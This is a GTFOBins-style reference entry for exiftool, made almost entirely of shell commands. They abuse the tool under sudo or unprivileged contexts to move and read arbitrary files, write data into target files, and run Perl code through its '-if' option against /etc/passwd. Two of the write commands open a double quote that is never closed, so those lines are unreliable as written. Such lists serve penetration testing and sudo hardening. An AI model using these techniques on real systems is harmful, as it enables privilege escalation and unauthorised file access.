---
type: gtfobin
name: exiftool
platform: Unix
functions: [file-read, file-write, inherit]
tags: [gtfobin, unix, lotl]
---

# exiftool

## file-read

```bash
exiftool -filename=/path/to/output-file /path/to/input-file
cat /path/to/output-file
```
_If the permissions allow it, files are moved (instead of copied) to the destination._
**Contexts:** sudo, unprivileged

## file-write

```bash
exiftool -filename=/path/to/output-file /path/to/input-file
```
_If the permissions allow it, files are moved (instead of copied) to the destination._
**Contexts:** sudo, unprivileged

```bash
exiftool "-description<=/path/to/input-file --filename /path/to/output-file
```
_The output file must exists, either empty or be a supported image file. The content is written amidst other content._
**Contexts:** sudo, unprivileged

```bash
exiftool "-description=DATA --filename /path/to/output-file
```
_The output file must exists, either empty or be a supported image file. The content is written amidst other content._
**Contexts:** sudo, unprivileged

```bash
exiftool -description -W /path/to/output-file --filename /path/to/input-file
```
_Writes the metadata tags of the input file in textual format to the output._
**Contexts:** sudo, unprivileged

## inherit

```bash
exiftool -if '...' /etc/passwd
```
_This allows to run Perl code (`...`)._
**Contexts:** sudo, unprivileged
